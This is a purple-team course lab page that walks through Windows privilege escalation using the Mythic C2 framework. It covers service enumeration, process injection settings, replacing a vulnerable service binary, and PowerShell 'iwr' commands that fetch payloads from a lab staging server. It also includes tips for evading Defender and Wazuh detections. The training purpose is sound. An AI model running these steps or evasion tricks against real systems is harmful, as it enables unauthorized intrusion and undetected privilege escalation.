---
layout: default
title: "Red Team Engage - Privilege Escalation"
permalink: /solo-purple-teaming/red-team-engage-privilege-escalation/
---

<link rel="stylesheet" href="/assets/css/solo-purple-teaming.css">

<div class="spt-page">
<a class="spt-back" href="/solo-purple-teaming/">← Back to Solo Purple Teaming</a>
<section class="spt-hero">
<p class="spt-kicker">Solo Purple Teaming</p>
<h1>Red Team Engage - Privilege Escalation</h1>
</section>
<section class="spt-content">

Owner: Mike Sterrett

## Introduction

In this phase, we will:

- Enumerate vulnerable services.
- Attempt privilege escalation.
- Trigger (and then work toward bypassing) remaining detections.
- End with a challenge for you to bypass the final detection before moving on to lateral movement.

---

### **1. Lab Setup & Context**

- **Starting point:** We already have **initial access** to the target system.
- **Goal:** Enumerate services, escalate privileges, and attempt to bypass detections.
- **Note:** One detection will intentionally trigger as a learning challenge.

---

### **2. Interact with the Compromised Host**

1. **Double-click** to interact with the existing callback in Mythic.
2. **Rename the tab** for clarity:
    - Set the tab description to:
        
        ```
        initial access
        
        ```
        
        and note the compromised user as `Arlen`.
        

---

### **3. Register the Service Scan Utility**

- In the Mythic interface:
    1. Use `register assembly`.
    2. Select **`service scan demo.exe`** from your files.
    3. Submit the task.
- **What happens:** The assembly is staged in memory for later execution (not run yet).

---

### **4. Configure Injection Technique**

1. Run `get injection techniques`.
2. Select:
    
    ```
    syscall_x64.ntcreatethreadex
    
    ```
    
3. Submit to apply this injection method.

---

### **5. Set the Spawn Process**

- Change spawn process to:
    
    ```
    smartscreen.exe
    
    ```
    
    (located in `C:\Windows\System32`)
    

---

### **6. Execute the Service Scan Assembly**

1. Use `execute assembly` on:
    
    ```
    service scan demo.exe
    
    ```
    
2. Switch to the **assume breach** host to watch for detections.
3. Confirm **Windows Defender** is enabled:
    - Go to **Windows Security → Manage Settings**.
    - **Real-time protection** and **Device Guard protection** should be **on**.
    - **Automatic sample submission** should be **off** (prevents lab payloads from being uploaded).
4. **Lab tip:** Keep lab hosts offline unless needed for updates or downloads.

---

### **7. Review Service Scan Results**

- Defender does not alert.
- Service scan output shows:
    - `ecoin sync` is **vulnerable**.
    - Current user **can start** the service **and modify** its binary.

---

### **8. Cleanup Before Exploiting**

1. Open a shell:
    
    ```
    cd Desktop
    ls
    
    ```
    
    - You should see the original `ecoin sync` binaries (malicious and legitimate) from Level 0.
2. Delete the old malicious binary:
    
    ```
    del ecoin sync.exe
    
    ```
    
    - **Lesson:** Always reset and clean up after each scenario.

---

### **9. Retrieve the Malicious Service Binary**

- Use PowerShell to download `ecoin sync.exe` from your staging server:
    
    ```powershell
    iwr http://192.168.100.101:8000/ecoin_sync.exe -outfile ecoin_sync.exe
    
    ```
    
    - Using `iwr` bypasses simple static-string detections on `Invoke-WebRequest`.
- Confirm with:
    
    ```
    ls
    
    ```
    
    The file should be present on the Desktop.
    

---

### **10. Retrieve Apollo Payload**

- The `ecoin sync` binary will pull and run **Apollo** from the Downloads folder.
- Download Apollo into `Downloads`:
    
    ```powershell
    iwr http://192.168.100.101:8000/apollo.exe -outfile C:\Users\Arlen\Downloads\apollo.exe
    
    ```
    
- **Hint:** Think about detections for unsigned executables in `Downloads`.

---

### **11. Start the Service**

- From shell:
    
    ```
    sc start "ecoin sync"
    
    ```
    
- Check Mythic — you should now have a **high-integrity callback** as `SVC ecoin sync`.

---

### **12. Check Detection Dashboard**

- In the Wazuh Solo Purple Teaming dashboard:
    - **One high alert** was a false positive (service enumeration by NT AUTHORITY, not you).
    - **One medium alert** (correlation detection) **DID trigger**:
        - Cause: Apollo is unsigned and ran from the `Downloads` folder.

---

### **13. Challenge for Students**

Before moving to the next lecture:

- Your task: **Bypass the last detection**.
- **Hint:** Investigate what calls Apollo from `Downloads` and how you could modify this so it no longer matches the detection rule.
- Goal: Escalate privileges **without any detection** firing.

---

### **14. Next Steps**

- Once you’ve bypassed the last detection, you’re ready for **lateral movement**.
- In the next lecture, we will gain access to the domain controller.

</section>
</div>
